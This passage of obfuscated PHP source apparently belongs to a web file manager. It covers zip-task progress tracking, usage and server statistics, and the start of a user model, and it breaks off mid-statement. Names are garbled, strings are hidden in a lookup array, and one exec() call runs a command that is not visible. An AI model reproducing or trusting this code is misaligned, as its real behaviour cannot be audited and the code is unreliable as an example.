$ø™ôõÖæ[522] => $öÂ¯æÕÃ[$ø™ôõÖæ[522]] ? $öÂ¯æÕÃ[$ø™ôõÖæ[522]] : $öÂ¯æÕÃ[$ø™ôõÖæ[76]]); $this->update(); } public function unzipAfter($ªÅ™İïù) { $ÑÇØ›øæ =& $_SERVER[Ù×¯Ø…]; $×ØŒ ™ó =& $this->task; $×ØŒ ™ó[$ÑÇØ›øæ[1671]] = $ÑÇØ›øæ[107]; $ö“”ıé® = IO::infoWithChildren($ªÅ™İïù); $•ÂíÍ¡˜ = 0; $×ØŒ ™ó[$ÑÇØ›øæ[1636]] = array($ÑÇØ›øæ[1637] => $•ÂíÍ¡˜ + 1, $ÑÇØ›øæ[424] => $ö“”ıé®[$ÑÇØ›øæ[28]], $ÑÇØ›øæ[76] => $ö“”ıé®[$ÑÇØ›øæ[76]], $ÑÇØ›øæ[522] => $ö“”ıé®[$ÑÇØ›øæ[522]] ? $ö“”ıé®[$ÑÇØ›øæ[522]] : $ö“”ıé®[$ÑÇØ›øæ[76]]); if ($ö“”ıé®[$ÑÇØ›øæ[29]] == $ÑÇØ›øæ[193]) { $×ØŒ ™ó[$ÑÇØ›øæ[1059]] = 1; } else { $×ØŒ ™ó[$ÑÇØ›øæ[1059]] = $ö“”ıé®[$ÑÇØ›øæ[81]][$ÑÇØ›øæ[79]]; } $×ØŒ ™ó[$ÑÇØ›øæ[1061]] = $ÑÇØ›øæ[33]; $×ØŒ ™ó[$ÑÇØ›øæ[1629]] = 0; $×ØŒ ™ó[$ÑÇØ›øæ[1581]] = 0; $×ØŒ ™ó[$ÑÇØ›øæ[1627]] = 0; $×ØŒ ™ó[$ÑÇØ›øæ[1628]] = 0; $×ØŒ ™ó[$ÑÇØ›øæ[1625]] = $ÑÇØ›øæ[33]; $×ØŒ ™ó[$ÑÇØ›øæ[1632]] = 0; $×ØŒ ™ó[$ÑÇØ›øæ[762]] = $ö“”ıé®[$ÑÇØ›øæ[78]]; $this->update(); self::log($ÑÇØ›øæ[1673] . json_encode(array($×ØŒ ™ó, $ö“”ıé®))); } public function nameParse($©äÇš×) { $•ÛÜ¤‚¿ =& $_SERVER[Ù×¯Ø…]; $Ì£¬„îŞ =& $this->task; if ($Ì£¬„îŞ[$•ÛÜ¤‚¿[1671]] == $•ÛÜ¤‚¿[1129]) { $Ì£¬„îŞ[$•ÛÜ¤‚¿[1671]] = $•ÛÜ¤‚¿[311]; $Ì£¬„îŞ[$•ÛÜ¤‚¿[1632]] = 0; $Ì£¬„îŞ[$•ÛÜ¤‚¿[762]] = 0; } $ÂçüÑ‹ = get_path_this($©äÇš×); if (strstr($ÂçüÑ‹, $•ÛÜ¤‚¿[95])) { $Ì£¬„îŞ[$•ÛÜ¤‚¿[1581]] += 1; $Ì£¬„îŞ[$•ÛÜ¤‚¿[1059]] += 1; } $Ì£¬„îŞ[$•ÛÜ¤‚¿[1625]] = $©äÇš×; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÙÒÇÂµé =& $_SERVER[Ù×¯Ø…]; parent::startAfter(); Hook::bind($ÙÒÇÂµé[1674], array($this, $ÙÒÇÂµé[1669])); $¨ÌÛœ„  =& $this->task; $¨ÌÛœ„ [$ÙÒÇÂµé[1671]] = $ÙÒÇÂµé[1129]; if (!$¨ÌÛœ„ [$ÙÒÇÂµé[1479]]) { $¨ÌÛœ„ [$ÙÒÇÂµé[1479]] = LNG($ÙÒÇÂµé[1675]); } } protected function endAfter() { $ğ’ºª =& $_SERVER[Ù×¯Ø…]; parent::endAfter(); Hook::unbind($ğ’ºª[1674], array($this, $ğ’ºª[1669])); } public function updateAfter() { $Ô•Æå–Ş =& $_SERVER[Ù×¯Ø…]; $î¯“á¹¢ =& $this->task; if (!$î¯“á¹¢[$Ô•Æå–Ş[1059]] || !$î¯“á¹¢[$Ô•Æå–Ş[762]]) { return; } if ($î¯“á¹¢[$Ô•Æå–Ş[1671]] == $Ô•Æå–Ş[1129]) { $£ÅŸöå¥ = $î¯“á¹¢[$Ô•Æå–Ş[1628]]; if ($î¯“á¹¢[$Ô•Æå–Ş[1629]] != $Ô•Æå–Ş[1129]) { $£ÅŸöå¥ = 0; } $Ş€İù = ($î¯“á¹¢[$Ô•Æå–Ş[1632]] + $£ÅŸöå¥) / $î¯“á¹¢[$Ô•Æå–Ş[762]]; $î¯“á¹¢[$Ô•Æå–Ş[1582]] = $Ş€İù * 0.3; } else { if ($î¯“á¹¢[$Ô•Æå–Ş[1671]] == $Ô•Æå–Ş[311]) { $Ş€İù = $î¯“á¹¢[$Ô•Æå–Ş[1581]] / $î¯“á¹¢[$Ô•Æå–Ş[1059]]; $î¯“á¹¢[$Ô•Æå–Ş[1582]] = 0.3 + $Ş€İù * 0.5; } else { if ($î¯“á¹¢[$Ô•Æå–Ş[1671]] == $Ô•Æå–Ş[107]) { $Ş€İù = 0; if ($î¯“á¹¢[$Ô•Æå–Ş[1627]]) { $Ş€İù = $î¯“á¹¢[$Ô•Æå–Ş[1628]] / $î¯“á¹¢[$Ô•Æå–Ş[1627]]; } $î¯“á¹¢[$Ô•Æå–Ş[1582]] = 0.3 + 0.5 + $Ş€İù * 0.2; } } } if ($î¯“á¹¢[$Ô•Æå–Ş[1582]] > 0) { $÷”ªşÌñ = timeFloat() - $î¯“á¹¢[$Ô•Æå–Ş[788]] - $î¯“á¹¢[$Ô•Æå–Ş[1585]]; $î¯“á¹¢[$Ô•Æå–Ş[1586]] = $÷”ªşÌñ * (1 - $î¯“á¹¢[$Ô•Æå–Ş[1582]]) / $î¯“á¹¢[$Ô•Æå–Ş[1582]]; } } public function copyFileStart($‚ÎÔ´÷Ê, $ÚïÚæÖ, $›–Ÿ¼š, $½·¢Ô³Ğ, $¨‡¡¯Ô³, $§éò’Æ©) { $à £ØªË =& $_SERVER[Ù×¯Ø…]; parent::copyFileStart($‚ÎÔ´÷Ê, $ÚïÚæÖ, $›–Ÿ¼š, $½·¢Ô³Ğ, $¨‡¡¯Ô³, $§éò’Æ©); $¹¬Ù¤ÇÓ =& $this->task; if ($¹¬Ù¤ÇÓ[$à £ØªË[1671]] == $à £ØªË[311]) { $¹¬Ù¤ÇÓ[$à £ØªË[1671]] = $à £ØªË[107]; } $this->update(); } public function copyFileEnd($¾Ÿ–¶ãš, $¥±‚ÑÅí, $ß—…®¼ , $òÙ“Ñê˜, $İù ½¶û, $’ãçïçê) { $£ÉıÀ‚â =& $_SERVER[Ù×¯Ø…]; $êºáÎİ =& $this->task; $êºáÎİ[$£ÉıÀ‚â[1628]] = $êºáÎİ[$£ÉıÀ‚â[1627]]; $êºáÎİ[$£ÉıÀ‚â[1632]] += $êºáÎİ[$£ÉıÀ‚â[1627]]; $êºáÎİ[$£ÉıÀ‚â[1629]] = $£ÉıÀ‚â[33]; $this->update(); } public function nameParse($àáé¯»²) { $Åìù‰ü =& $_SERVER[Ù×¯Ø…]; $Ä–ÌÍ =& $this->task; if ($Ä–ÌÍ[$Åìù‰ü[1581]] < $Ä–ÌÍ[$Åìù‰ü[1059]]) { $©ÒÊ×ƒÄ = get_path_this($àáé¯»²); if (strstr($©ÒÊ×ƒÄ, $Åìù‰ü[95])) { $Ä–ÌÍ[$Åìù‰ü[1581]] += 1; } } if ($Ä–ÌÍ[$Åìù‰ü[1671]] == $Åìù‰ü[1129]) { $Ä–ÌÍ[$Åìù‰ü[1671]] = $Åìù‰ü[311]; } $Ä–ÌÍ[$Åìù‰ü[1625]] = $àáé¯»²; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¤ÖÆ¶©‚) { $×ÊÎŒş÷ =& $_SERVER[Ù×¯Ø…]; $éÃ¶¨¦´ = array($×ÊÎŒş÷[597] => array($×ÊÎŒş÷[29] => $×ÊÎŒş÷[1676], $×ÊÎŒş÷[271] => array($×ÊÎŒş÷[222], $×ÊÎŒş÷[764], $×ÊÎŒş÷[1677], $×ÊÎŒş÷[1678])), $×ÊÎŒş÷[1679] => array($×ÊÎŒş÷[29] => $×ÊÎŒş÷[1680], $×ÊÎŒş÷[271] => array($×ÊÎŒş÷[222], $×ÊÎŒş÷[762], $×ÊÎŒş÷[1681], $×ÊÎŒş÷[1682], $×ÊÎŒş÷[1683]))); if (!isset($éÃ¶¨¦´[$¤ÖÆ¶©‚])) { return !1; } $this->optionType = $éÃ¶¨¦´[$¤ÖÆ¶©‚][$×ÊÎŒş÷[29]]; $this->field = $éÃ¶¨¦´[$¤ÖÆ¶©‚][$×ÊÎŒş÷[271]]; return !0; } public function listData($ø² İí× = false, $ßØûĞ‹ = "\x6d\x6f\x64\151\146\x79\x54\x69\155\x65", $­€Îôµä = false) { return parent::listData($ø² İí×, $ßØûĞ‹, $­€Îôµä); } public function trendList($€¾åò–í) { $˜‘›ö» =& $_SERVER[Ù×¯Ø…]; $€êã¾î” = $this->listData(); if ($€êã¾î”) { $Ïœ•¼‡æ = end($€êã¾î”); $íŸ–Àó˜ = date($˜‘›ö»[1684], strtotime($˜‘›ö»[1685])); if ($Ïœ•¼‡æ[$˜‘›ö»[222]] == $íŸ–Àó˜) { return $€êã¾î”; } $Ã‰Í‡Á“ = strtotime($Ïœ•¼‡æ[$˜‘›ö»[222]]); } if (!isset($Ã‰Í‡Á“)) { $ÂïŞ­ş¢ = $€¾åò–í == $˜‘›ö»[597] ? $˜‘›ö»[541] : $˜‘›ö»[831]; $Ã‰Í‡Á“ = Model($ÂïŞ­ş¢)->min($˜‘›ö»[194]); } $ûÎáÛ¸½ = $˜‘›ö»[1686] . ucfirst($€¾åò–í); $ŠÊüÙ¸ = $this->dateList($Ã‰Í‡Á“); foreach ($ŠÊüÙ¸ as $íŸ–Àó˜) { $this->{$ûÎáÛ¸½}($íŸ–Àó˜); } return $this->listData(); } private function dateList($éË›¢š) { $êÜñÄ¨È =& $_SERVER[Ù×¯Ø…]; $õ¼ÇÍ± = $éË›¢š; $Å¦“Åôì = strtotime($êÜñÄ¨È[1685]); $æ¨™üÓÒ = array(); while ($õ¼ÇÍ± <= $Å¦“Åôì) { $æ¨™üÓÒ[] = date($êÜñÄ¨È[1684], $õ¼ÇÍ±); $õ¼ÇÍ± = strtotime($êÜñÄ¨È[1687], $õ¼ÇÍ±); } return $æ¨™üÓÒ; } public function _recordUser($¹Úû÷ÂË = '') { $•“˜ŠÈÚ =& $_SERVER[Ù×¯Ø…]; $®Ú‹ùÃö = strtotime(date($•“˜ŠÈÚ[1688], strtotime($¹Úû÷ÂË))); $Ğ½îË‹“ = strtotime(date($•“˜ŠÈÚ[1689], strtotime($¹Úû÷ÂË))); $¯Ş®­Û’ = array($•“˜ŠÈÚ[194] => array($•“˜ŠÈÚ[1009], $Ğ½îË‹“)); $†Â†³û½ = Model($•“˜ŠÈÚ[541])->where($¯Ş®­Û’)->count($•“˜ŠÈÚ[1580]); $¯Ş®­Û’[$•“˜ŠÈÚ[194]] = array($•“˜ŠÈÚ[331], array($®Ú‹ùÃö, $Ğ½îË‹“)); $ìßÄä² = Model($•“˜ŠÈÚ[541])->where($¯Ş®­Û’)->count($•“˜ŠÈÚ[1580]); $¯Ş®­Û’[$•“˜ŠÈÚ[29]] = $•“˜ŠÈÚ[1690]; $©¾¼ŸÀğ = Model($•“˜ŠÈÚ[1691])->where($¯Ş®­Û’)->count($•“˜ŠÈÚ[1692]); $¿â²¦ığ = array($•“˜ŠÈÚ[222] => $¹Úû÷ÂË, $•“˜ŠÈÚ[764] => (int) $†Â†³û½, $•“˜ŠÈÚ[1677] => (int) $ìßÄä², $•“˜ŠÈÚ[1678] => (int) $©¾¼ŸÀğ); return $this->insert($¿â²¦ığ); } public function _recordStore($óŞÕ“«„ = '') { $ƒŒ÷ºÓ =& $_SERVER[Ù×¯Ø…]; $£Üå°Òª = strtotime(date($ƒŒ÷ºÓ[1689], strtotime($óŞÕ“«„))); $ÏÀ¸é¯£ = array($ƒŒ÷ºÓ[194] => array($ƒŒ÷ºÓ[1009], $£Üå°Òª)); $ÇÕ•ø‘ò = Model($ƒŒ÷ºÓ[473])->where($ÏÀ¸é¯£)->sum($ƒŒ÷ºÓ[78]); $ÏÀ¸é¯£[$ƒŒ÷ºÓ[414]] = 0; $¹¿ñ£¨ = Model($ƒŒ÷ºÓ[831])->where($ÏÀ¸é¯£)->sum($ƒŒ÷ºÓ[78]); $ÏÀ¸é¯£[$ƒŒ÷ºÓ[415]] = 1; $çõéîÙ¼ = Model($ƒŒ÷ºÓ[831])->where($ÏÀ¸é¯£)->sum($ƒŒ÷ºÓ[78]); $ÏÀ¸é¯£[$ƒŒ÷ºÓ[415]] = 2; $î‚›Ë÷ó = Model($ƒŒ÷ºÓ[831])->where($ÏÀ¸é¯£)->sum($ƒŒ÷ºÓ[78]); $ÄÆÖûùœ = array($ƒŒ÷ºÓ[222] => $óŞÕ“«„, $ƒŒ÷ºÓ[762] => (int) $¹¿ñ£¨, $ƒŒ÷ºÓ[1681] => (int) $ÇÕ•ø‘ò, $ƒŒ÷ºÓ[1682] => (int) $çõéîÙ¼, $ƒŒ÷ºÓ[1683] => (int) $î‚›Ë÷ó); return $this->insert($ÄÆÖûùœ); } public function trend($¼Ç„Ò†ø, $ïµï†òÍ) { $¸º¤ÅÎ =& $_SERVER[Ù×¯Ø…]; if (!$this->init($¼Ç„Ò†ø)) { return !1; } $´çô‹Ë = $this->trendList($¼Ç„Ò†ø); if ($´çô‹Ë && $ïµï†òÍ != $¸º¤ÅÎ[1553]) { $Ãæ‰¤²Á = $´çô‹Ë[0][$¸º¤ÅÎ[222]]; $šŠäËõ = $this->validDate($ïµï†òÍ, $Ãæ‰¤²Á); $Äª“Í§€ = array(); $Îˆõ«ƒ– = array_to_keyvalue($´çô‹Ë, $¸º¤ÅÎ[222]); foreach ($šŠäËõ as $ˆ¡›öÔ‘) { if (isset($Îˆõ«ƒ–[$ˆ¡›öÔ‘])) { $üÈü¿òû = $Îˆõ«ƒ–[$ˆ¡›öÔ‘]; } else { $üÈü¿òû = end($´çô‹Ë); $üÈü¿òû[$¸º¤ÅÎ[222]] = $ˆ¡›öÔ‘; if ($¼Ç„Ò†ø == $¸º¤ÅÎ[597]) { $üÈü¿òû[$¸º¤ÅÎ[1677]] = $üÈü¿òû[$¸º¤ÅÎ[1678]] = 0; } } $Äª“Í§€[] = $üÈü¿òû; } $´çô‹Ë = $Äª“Í§€; } $ñïâñÈ = array($¸º¤ÅÎ[597] => array($¸º¤ÅÎ[764] => LNG($¸º¤ÅÎ[1693]), $¸º¤ÅÎ[1677] => LNG($¸º¤ÅÎ[1694]), $¸º¤ÅÎ[1678] => LNG($¸º¤ÅÎ[1695])), $¸º¤ÅÎ[1679] => array($¸º¤ÅÎ[762] => LNG($¸º¤ÅÎ[1696]), $¸º¤ÅÎ[1681] => LNG($¸º¤ÅÎ[1697]), $¸º¤ÅÎ[1682] => LNG($¸º¤ÅÎ[1698]), $¸º¤ÅÎ[1683] => LNG($¸º¤ÅÎ[1699]))); $¢äêßäª = array($¸º¤ÅÎ[597] => $¸º¤ÅÎ[1700], $¸º¤ÅÎ[1679] => $¸º¤ÅÎ[78]); if (empty($´çô‹Ë)) { $ˆ¡›öÔ‘ = date($¸º¤ÅÎ[1684], strtotime($¸º¤ÅÎ[1685])); $Ó”ûÛ«‘ = array($¸º¤ÅÎ[222] => $ˆ¡›öÔ‘); foreach ($ñïâñÈ[$¼Ç„Ò†ø] as $ĞÖÎš¡à => $ÅÁÃÃú¡) { $Ó”ûÛ«‘[$ĞÖÎš¡à] = 0; } $´çô‹Ë[] = $Ó”ûÛ«‘; } $ş–Ô— = array(); foreach ($´çô‹Ë as $ÅÁÃÃú¡) { if ($¼Ç„Ò†ø == $¸º¤ÅÎ[1679] && $ÅÁÃÃú¡[$¸º¤ÅÎ[1681]] > $ÅÁÃÃú¡[$¸º¤ÅÎ[762]]) { $ÅÁÃÃú¡[$¸º¤ÅÎ[1681]] = $ÅÁÃÃú¡[$¸º¤ÅÎ[762]]; } foreach ($ñïâñÈ[$¼Ç„Ò†ø] as $ĞÖÎš¡à => $æ§–ØÉ×) { $üÈü¿òû = array($¸º¤ÅÎ[222] => $ÅÁÃÃú¡[$¸º¤ÅÎ[222]], $¸º¤ÅÎ[1479] => $æ§–ØÉ×); $üÈü¿òû[$¢äêßäª[$¼Ç„Ò†ø]] = isset($ÅÁÃÃú¡[$ĞÖÎš¡à]) ? $ÅÁÃÃú¡[$ĞÖÎš¡à] : 0; $ş–Ô—[] = $üÈü¿òû; } } return $ş–Ô—; } public function validDate($Œ³¢ûØÕ, $Ğ‘¶ô¶Ñ) { $Üõ¾çÎİ =& $_SERVER[Ù×¯Ø…]; $Ç·Ğ½“£ = date($Üõ¾çÎİ[1684], strtotime($Üõ¾çÎİ[1685])); $¶¯–ä©¬ = array($Ç·Ğ½“£); switch ($Œ³¢ûØÕ) { case $Üõ¾çÎİ[1560]: $ı£é—Á = mktime(0, 0, 0, date($Üõ¾çÎİ[1701]), date($Üõ¾çÎİ[1301]) - date($Üõ¾çÎİ[1362]) + 7 - 7, date($Üõ¾çÎİ[1702])); $áˆ÷¿ŞÌ = 0; do { $ ª‰òå = date($Üõ¾çÎİ[1684], $ı£é—Á - 3600 * 24 * 7 * $áˆ÷¿ŞÌ); $¶¯–ä©¬[] = $ ª‰òå; $áˆ÷¿ŞÌ++; } while ($Ğ‘¶ô¶Ñ < $ ª‰òå); break; case $Üõ¾çÎİ[1558]: $áˆ÷¿ŞÌ = 1; do { $öÄí¾Ô§ = date($Üõ¾çÎİ[1703], strtotime("\55\x20{$áˆ÷¿ŞÌ}\40\x6d\x6f\156\164\150\x73")); $¶¯–ä©¬[] = $öÄí¾Ô§; $áˆ÷¿ŞÌ++; } while ($Ğ‘¶ô¶Ñ < $öÄí¾Ô§); break; case $Üõ¾çÎİ[1704]: $Ö½ÒĞ¿Ì = (int) date($Üõ¾çÎİ[1702], strtotime($Ğ‘¶ô¶Ñ)); $…‚‰æû· = (int) date($Üõ¾çÎİ[1702]); if ($Ö½ÒĞ¿Ì >= $…‚‰æû·) { break; } for ($Ö½ÒĞ¿Ì; $Ö½ÒĞ¿Ì < $…‚‰æû·; $Ö½ÒĞ¿Ì++) { $¶¯–ä©¬[] = $Ö½ÒĞ¿Ì . $Üõ¾çÎİ[1705]; } break; default: break; } if ($Ğ‘¶ô¶Ñ > end($¶¯–ä©¬)) { array_pop($¶¯–ä©¬); } sort($¶¯–ä©¬); return $¶¯–ä©¬; } public function listTable($ë† º‰É) { $¶»‰ä®Ò = ucfirst($ë† º‰É); return Model($¶»‰ä®Ò)->listData(); } public function option($áá¶Ğ) { $‹…½öı‰ = $_SERVER[Ù×¯Ø…][1706] . ucfirst($áá¶Ğ); return $this->{$‹…½öı‰}(); } private function optionUser() { $“¾ûÄ™Ü =& $_SERVER[Ù×¯Ø…]; $óşë = Model($“¾ûÄ™Ü[541])->count($“¾ûÄ™Ü[1580]); $¿ˆ°›á = Model($“¾ûÄ™Ü[541])->where($“¾ûÄ™Ü[1707])->count($“¾ûÄ™Ü[1580]); $°«òÜŒ® = intval($GLOBALS[$“¾ûÄ™Ü[6]][$“¾ûÄ™Ü[347]][$“¾ûÄ™Ü[1536]]) / 3600; $â‹‘á½Ï = strtotime("\x2d{$°«òÜŒ®}\40\x68\157\x75\x72\x73"); $¼¾ã˜ = strtotime(date($“¾ûÄ™Ü[1688])); if ($â‹‘á½Ï < $¼¾ã˜) { $â‹‘á½Ï = $¼¾ã˜; } $¶Ú‰ª˜ = array($“¾ûÄ™Ü[1708] => array($“¾ûÄ™Ü[1010], $â‹‘á½Ï)); $şıá¡Àº = (int) Model($“¾ûÄ™Ü[541])->where($¶Ú‰ª˜)->count($“¾ûÄ™Ü[1580]); if (!$şıá¡Àº) { $şıá¡Àº = 1; } $¶Ú‰ª˜ = array($“¾ûÄ™Ü[1708] => array($“¾ûÄ™Ü[1010], $¼¾ã˜)); $¸Ì¸ø¶è = Model($“¾ûÄ™Ü[541])->where($¶Ú‰ª˜)->count($“¾ûÄ™Ü[1580]); return array($“¾ûÄ™Ü[758] => (int) $óşë, $“¾ûÄ™Ü[1709] => (int) ($óşë - $¿ˆ°›á), $“¾ûÄ™Ü[1710] => (int) $¿ˆ°›á, $“¾ûÄ™Ü[1711] => (int) $¸Ì¸ø¶è, $“¾ûÄ™Ü[1712] => $şıá¡Àº); } private function optionFile() { $µëìş³› =& $_SERVER[Ù×¯Ø…]; $î¢Ùü õ = $this->sourceSize(); $Ó‹”Ç®— = $î¢Ùü õ[$µëìş³›[78]]; $÷ÆåÕŞ» = $î¢Ùü õ[$µëìş³›[1681]]; $ÌÁ§’Ì· = Model($µëìş³›[831])->where(array($µëìş³›[414] => 0))->count($µëìş³›[406]); $±§øƒ§ = array($µëìş³›[414] => 0, $µëìş³›[194] => array($µëìş³›[1010], strtotime(date($µëìş³›[1688])))); $ˆÈµé¹“ = Model($µëìş³›[831])->where($±§øƒ§)->sum($µëìş³›[78]); $¡¼’‘ª© = Model($µëìş³›[831])->where($±§øƒ§)->count($µëìş³›[406]); return array($µëìş³›[762] => $Ó‹”Ç®—, $µëìş³›[1681] => $÷ÆåÕŞ», $µëìş³›[1713] => $Ó‹”Ç®— - $÷ÆåÕŞ», $µëìş³›[1714] => (int) $ˆÈµé¹“, $µëìş³›[764] => (int) $ÌÁ§’Ì·, $µëìş³›[1715] => (int) $¡¼’‘ª©); } private function optionAccess() { $ôó›¼ëë =& $_SERVER[Ù×¯Ø…]; return array($ôó›¼ëë[758] => $this->typeLogCnt(), $ôó›¼ëë[107] => $this->typeLogCnt($ôó›¼ëë[107]), $ôó›¼ëë[453] => $this->typeLogCnt($ôó›¼ëë[453]), $ôó›¼ëë[1716] => $this->typeLogCnt($ôó›¼ëë[1716]), $ôó›¼ëë[1717] => $this->typeLogCnt($ôó›¼ëë[1717]), $ôó›¼ëë[597] => $this->typeLogCnt($ôó›¼ëë[33], $ôó›¼ëë[1692])); } private function typeLogCnt($Š‘İ…Ş = '', $î÷’–ıâ = "\x69\x64") { $ˆîíÀ½ =& $_SERVER[Ù×¯Ø…]; $ğÖœ¦Ù = array($ˆîíÀ½[107] => array($ˆîíÀ½[1718], $ˆîíÀ½[1719]), $ˆîíÀ½[453] => array($ˆîíÀ½[1720], $ˆîíÀ½[1721]), $ˆîíÀ½[1716] => array($ˆîíÀ½[1722], $ˆîíÀ½[1723], $ˆîíÀ½[1724]), $ˆîíÀ½[1717] => array($ˆîíÀ½[1725], $ˆîíÀ½[1726]), $ˆîíÀ½[1727] => array($ˆîíÀ½[1728], $ˆîíÀ½[1729], $ˆîíÀ½[1730])); $àí¤ğÚ’ = strtotime(date($ˆîíÀ½[1688])); $ô—¡†‘¾ = array($ˆîíÀ½[194] => array($ˆîíÀ½[1010], $àí¤ğÚ’)); if ($Š‘İ…Ş) { $ô—¡†‘¾[$ˆîíÀ½[29]] = array($ˆîíÀ½[7], $ğÖœ¦Ù[$Š‘İ…Ş]); } $õ½áÆ©€ = Model($ˆîíÀ½[1691])->where($ô—¡†‘¾)->count($î÷’–ıâ); return (int) $õ½áÆ©€; } private function optionServer() { $»†Â›ûû =& $_SERVER[Ù×¯Ø…]; $¦ÜíÕÄü = $this->diskDriver(); $’–È€ê = KodIO::defaultDriver(); $¼Èä¸Õ = array($»†Â›ûû[823] => $’–È€ê[$»†Â›ûû[395]]); $Ãï•“Áå = Model($»†Â›ûû[473])->where($¼Èä¸Õ)->sum($»†Â›ûû[78]); $¡®×¹°à = explode($»†Â›ûû[50], $_SERVER[$»†Â›ûû[142]]); $¸°€¯É† = $¡®×¹°à[0]; $ŸÂÑŠñı = $GLOBALS[$»†Â›ûû[6]][$»†Â›ûû[17]]; $ğıí÷İ½ = $ŸÂÑŠñı[$»†Â›ûû[971]]; if ($ğıí÷İ½ == $»†Â›ûû[796]) { $‚ŸñĞÜ = explode($»†Â›ûû[1202], $ŸÂÑŠñı[$»†Â›ûû[970]]); $ğıí÷İ½ = $‚ŸñĞÜ[0]; } if ($ğıí÷İ½ == $»†Â›ûû[799] || $ğıí÷İ½ == $»†Â›ûû[800]) { $½–ÖòÖÒ = Model()->db()->query($»†Â›ûû[1731]); $ÜèêîÉ = $½–ÖòÖÒ[0] && isset($½–ÖòÖÒ[0][$»†Â›ûû[1478]]) ? $½–ÖòÖÒ[0][$»†Â›ûû[1478]] : 0; $ğıí÷İ½ = $»†Â›ûû[1732] . ($ÜèêîÉ ? $»†Â›ûû[8] . $ÜèêîÉ : $»†Â›ûû[33]); } $½ÄñîÒÎ = $GLOBALS[$»†Â›ûû[6]][$»†Â›ûû[347]][$»†Â›ûû[833]]; return array($»†Â›ûû[1733] => $¦ÜíÕÄü ? $¦ÜíÕÄü[$»†Â›ûû[1734]] : 0, $»†Â›ûû[1735] => $¦ÜíÕÄü ? $¦ÜíÕÄü[$»†Â›ûû[1736]] : 0, $»†Â›ûû[1737] => (int) $’–È€ê[$»†Â›ûû[1734]] * 1024 * 1024 * 1024, $»†Â›ûû[1738] => (int) $Ãï•“Áå, $»†Â›ûû[1739] => ucfirst($¸°€¯É†), $»†Â›ûû[1740] => $»†Â›ûû[1741] . PHP_VERSION, $»†Â›ûû[1742] => phpBuild64() ? 64 : 32, $»†Â›ûû[757] => str_replace($»†Â›ûû[1743], $»†Â›ûû[987], $ğıí÷İ½), $»†Â›ûû[347] => ucfirst($½ÄñîÒÎ), $»†Â›ûû[28] => $_SERVER[$»†Â›ûû[1744]]); } private function diskDriver() { $ôˆ­¹Ñ¢ =& $_SERVER[Ù×¯Ø…]; $İˆ¡¥²± = $ôˆ­¹Ñ¢[8]; $øÓ½û¨ = $GLOBALS[$ôˆ­¹Ñ¢[6]][$ôˆ­¹Ñ¢[1218]] == $ôˆ­¹Ñ¢[1219]; if ($øÓ½û¨) { $İˆ¡¥²± = $ôˆ­¹Ñ¢[1745]; if (function_exists($ôˆ­¹Ñ¢[1746])) { exec($ôˆ­¹Ñ¢[1747], $‚şÅ®İ); $İˆ¡¥²± = $‚şÅ®İ[1] . $ôˆ­¹Ñ¢[8]; } } if (!file_exists($İˆ¡¥²±)) { return; } $¢â‘‘É© = @disk_total_space($İˆ¡¥²±); $µ •éÖ– = $¢â‘‘É© - @disk_free_space($İˆ¡¥²±); return array($ôˆ­¹Ñ¢[1734] => $¢â‘‘É©, $ôˆ­¹Ñ¢[1736] => $µ •éÖ–); } public function fileChart($¾€â¨¥ù) { $êÉ•×Û =& $_SERVER[Ù×¯Ø…]; if (isset($¾€â¨¥ù[$êÉ•×Û[1580]])) { return Model($êÉ•×Û[831])->userFileTypeProfile($¾€â¨¥ù[$êÉ•×Û[1580]]); } if (isset($¾€â¨¥ù[$êÉ•×Û[1748]])) { return Model($êÉ•×Û[831])->groupFileTypeProfile($¾€â¨¥ù[$êÉ•×Û[1748]]); } $¦°ÓÒ = $this->sourceSize(); $‚Ó‹ü‘ = array($êÉ•×Û[501] => 0, $êÉ•×Û[415] => 1); $ßúÃ ø” = Model($êÉ•×Û[831])->where($‚Ó‹ü‘)->sum($êÉ•×Û[78]); $‚Ó‹ü‘[$êÉ•×Û[415]] = 2; $×»ƒÖ’× = Model($êÉ•×Û[831])->where($‚Ó‹ü‘)->sum($êÉ•×Û[78]); return array($êÉ•×Û[762] => $¦°ÓÒ[$êÉ•×Û[78]], $êÉ•×Û[1681] => $¦°ÓÒ[$êÉ•×Û[1681]], $êÉ•×Û[1682] => (int) $ßúÃ ø”, $êÉ•×Û[1683] => (int) $×»ƒÖ’×); } private function sourceSize() { $çïï à» =& $_SERVER[Ù×¯Ø…]; $ƒÑù«ªñ = Model($çïï à»[831])->where(array($çïï à»[414] => 0))->sum($çïï à»[78]); $Ğî¡ĞÊ— = Model($çïï à»[473])->sum($çïï à»[78]); if ($Ğî¡ĞÊ— > $ƒÑù«ªñ) { $Ğî¡ĞÊ— = $ƒÑù«ªñ; } return array($çïï à»[78] => (int) $ƒÑù«ªñ, $çïï à»[1681] => (int) $Ğî¡ĞÊ—); } } goto c’‚æØšß¶; c‰ÜŠ™İæ: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\164\x61\142\154\145\x4e\x61\155\x65" => "\x75\163\145\x72\x5f\155\145\x74\141", "\x6d\145\x74\x61\x46\151\145\x6c\x64" => "\165\x73\145\162\x49\x44"); protected $simpleField = "\165\163\145\162\111\104\54\x6e\151\x63\x6b\116\141\155\x65\x2c\x6e\x61\155\145\54\x61\x76\141\x74\141\x72\x2c\x73\x65\x78\54\163\x74\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ûé¢†•Ì) { $èŠ¿ĞŸ‘ =& $_SERVER[Ù×¯Ø…]; $Ğô¨íï¬ = $èŠ¿ĞŸ‘[2176]; return array($èŠ¿ĞŸ‘[1825] => array($ûé¢†•Ì[0], $Ğô¨íï¬), $èŠ¿ĞŸ‘[1827] => array($ûé¢†•Ì[0], $Ğô¨íï¬), $èŠ¿ĞŸ‘[2177] => array($ûé¢†•Ì[0], $Ğô¨íï¬)); } protected function getInfo($ûéïÀ‚…, $ìÄ€²Ù™ = false) { $½¾İÄ¤û = $this->getInfoSimple($ûéïÀ‚…); if (!is_array($½¾İÄ¤û)) { return array(); } if ($ìÄ€²Ù™) { return $this->_getInfoApply($½¾İÄ¤û); } return $this->cacheFunctionGet($_SERVER[Ù×¯Ø…][1829], 